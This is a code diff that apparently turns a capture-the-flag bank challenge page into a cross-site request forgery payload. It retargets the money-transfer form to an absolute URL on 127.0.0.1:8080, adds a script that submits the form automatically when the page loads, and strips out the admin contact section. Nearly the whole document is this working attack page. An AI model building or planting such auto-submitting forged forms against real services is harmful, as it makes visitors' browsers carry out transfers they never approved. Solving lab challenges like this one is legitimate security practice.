@@ -18,7 +18,7 @@
 <body>
     <div class="container">
         <h2 id="sad">You have</h2>
-        <form id="12" action='/transfer' method="POST">
+        <form id="12" action='https://127.0.0.1:8080/transfer' method="POST">
             <div class="form-row">
               <div class="form-group col-md-6">
                 <label for="inputTo">To</label>
@@ -32,32 +32,9 @@
             <button type="submit" class="btn btn-primary">Send the Money!</button>
           </form>
 
-          <a href="/buyflag">Click here to buy the flag!</a>
+          <script>document.getElementById("12").submit()</script>
     </div>
     
-
-    <br>
-    <hr>
-    <br>
-
-    <div class="container">
-        <h2>Contact the admin if you have amazing business opportunities!</h2>
-        <form action='/contact' method="POST">
-            <div class="form-row">
-                <div class="form-group col-md-4">
-                    <input type="text" class="form-control" id="inputHomepage" name="homepage" placeholder="Your homepage (we will visit this)">
-                </div>
-                <div class="form-group col-md-4">
-                    <input type="number" class="form-control" id="inputQuery" name="query" placeholder="Your enquiry (we won't look at this)">
-                </div>
-            
-                <div class="form-group col-md-4"></div>
-                    <button type="submit" class="btn btn-primary">Call Us Now!</button>
-                </div>
-            </div>
-          </form>
-    </div>
-
 
 
     <script>
